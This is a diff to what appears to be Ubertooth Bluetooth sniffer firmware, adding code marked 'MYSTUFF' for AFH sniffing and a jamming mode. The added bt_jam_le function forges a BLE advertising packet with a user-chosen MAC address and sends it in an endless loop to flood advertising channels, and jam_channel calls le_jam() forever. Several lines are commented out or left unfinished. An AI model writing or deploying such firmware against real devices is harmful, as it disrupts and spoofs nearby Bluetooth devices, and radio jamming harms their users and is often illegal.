@@ -51,6 +51,8 @@ volatile uint16_t hop_timeout = 158;
 volatile uint16_t requested_channel = 0;
 volatile uint16_t le_adv_channel = 2402;
 volatile int      cancel_follow = 0;
+//MYSTUFF
+volatile uint8_t  le_afh_cutoff = 0;
 
 /* bulk USB stuff */
 volatile uint8_t  idle_buf_clkn_high = 0;
@@ -64,6 +66,8 @@ volatile uint8_t mode = MODE_IDLE;
 volatile uint8_t requested_mode = MODE_IDLE;
 volatile uint8_t jam_mode = JAM_NONE;
 volatile uint8_t ego_mode = EGO_FOLLOW;
+//MYSTUFF
+volatile uint8_t jam_channel_number = JAM_CHANNEL_OFF;
 
 volatile uint8_t modulation = MOD_BT_BASIC_RATE;
 
@@ -553,6 +557,21 @@ static int vendor_request_handler(uint8_t request, uint16_t* request_params, uin
 		cs_threshold_calc_and_set(channel);
 		break;
 
+	//MYSTUFF
+	case UBERTOOTH_LE_SNIFFING_AFH:
+		le.do_follow = 1;
+		//le_afh_cutoff = request_params[0];
+		*data_len = 0;
+
+		do_hop = 0;
+		//hop_mode = HOP_BTLE_AFH;
+		hop_mode = HOP_BTLE;
+		requested_mode = MODE_BT_FOLLOW_LE;
+
+		usb_queue_init();
+		cs_threshold_calc_and_set(channel);
+		break;
+
 	case UBERTOOTH_GET_ACCESS_ADDRESS:
 		for(int i=0; i < 4; i++) {
 			data[i] = (le.access_address >> (8*i)) & 0xff;
@@ -717,6 +736,14 @@ static int vendor_request_handler(uint8_t request, uint16_t* request_params, uin
 		ego_mode = request_params[0];
 		break;
 
+	//MYSTUFF
+	case UBERTOOTH_JAM_CHANNEL_MODE:
+		memcpy(slave_mac_address, data, 6);
+		requested_mode = MODE_JAM;
+		//requested_mode = MODE_JAM;
+		//jam_channel_number = request_params[0];
+		break;
+
 	default:
 		return 0;
 	}
@@ -817,6 +844,21 @@ static void msleep(uint32_t millis)
 {
 	uint32_t now = (clkn & 0xffffff);
 	uint32_t stop_at = now + millis * 10000 / 3125; // millis -> clkn ticks
+
+	// handle clkn overflow
+	if (stop_at >= ((uint32_t)1<<28)) {
+		stop_at -= ((uint32_t)1<<28);
+		while ((clkn & 0xffffff) >= now || (clkn & 0xffffff) < stop_at);
+	} else {
+		while ((clkn & 0xffffff) < stop_at);
+	}
+}
+
+//MYSTUFF
+static void microsleep(uint32_t micros)
+{
+	uint32_t now = (clkn & 0xffffff);
+	uint32_t stop_at = now + micros * 10 / 3125; // millis -> clkn ticks
 
 	// handle clkn overflow
 	if (stop_at >= ((uint32_t)1<<28)) {
@@ -1253,6 +1295,11 @@ void hop(void)
 
 	else if (hop_mode == HOP_BTLE) {
 		channel = btle_next_hop(&le);
+	}
+
+	//MYSTUFF
+	else if (hop_mode == HOP_BTLE_AFH) {
+		channel = btle_next_hop_afh(&le, le_afh_cutoff);
 	}
 
 	else if (hop_mode == HOP_DIRECT) {
@@ -2567,6 +2614,80 @@ void led_specan()
 	}
 }
 
+//MYSTUFF
+void jam_channel(int channel_number){
+	wait(1);
+		gpio_init();
+
+	for (int i = 0; i < channel_number; i++) {
+		USRLED_SET;
+		TXLED_SET;
+		RXLED_SET;
+		wait(1);
+		USRLED_CLR;
+		TXLED_CLR;
+		RXLED_CLR;
+		wait(1);
+	}
+
+	while(1){
+		//cc2400_repeater(&channel_number);
+		le_jam();
+		TXLED_CLR;
+		wait(1);
+	}
+}
+
+//MYSTUFF
+void bt_jam_le() {
+	u32 calc_crc;
+	int i;
+	uint8_t adv_ind[32] = { 0x00, };
+	uint8_t adv_ind_len;
+
+	if (le_adv_len > LE_ADV_MAX_LEN) {
+		requested_mode = MODE_IDLE;
+		return;
+	}
+
+	adv_ind_len = 6 + le_adv_len;
+	adv_ind[1] = adv_ind_len;
+
+	// copy the user-specified mac address
+	for (i = 0; i < 6; ++i)
+		adv_ind[i+2] = slave_mac_address[5-i];
+
+	// copy in the adv data
+	memcpy(adv_ind + 2 + 6, le_adv_data, le_adv_len);
+
+	// total: 2 + 6 + le_adv_len
+	adv_ind_len += 2;
+
+	calc_crc = btle_calc_crc(le.crc_init_reversed, adv_ind, adv_ind_len);
+	adv_ind[adv_ind_len + 0] = (calc_crc >>  0) & 0xff;
+	adv_ind[adv_ind_len + 1] = (calc_crc >>  8) & 0xff;
+	adv_ind[adv_ind_len + 2] = (calc_crc >> 16) & 0xff;
+
+	clkn_start();
+
+	// enable USB interrupts due to busy waits
+	ISER0 = ISER0_ISE_USB;
+
+	// spam advertising packets
+	while (requested_mode == MODE_JAM) {
+		le_transmit(0x8e89bed6, adv_ind_len+3, adv_ind);
+		//msleep(1);
+		// int i = 1000000;
+		// while (i > 0){
+		// 	--i;
+		// }
+		//microsleep(320);
+	}
+
+	// disable USB interrupts
+	ICER0 = ICER0_ICE_USB;
+}
+
 int main()
 {
 	ubertooth_init();
@@ -2645,6 +2766,11 @@ int main()
 					break;
 				case MODE_IDLE:
 					cc2400_idle();
+					break;
+				//MYSTUFF
+				case MODE_JAM:
+					//jam_channel(jam_channel_number);
+					bt_jam_le();
 					break;
 				default:
 					/* This is really an error state, but what can you do? */
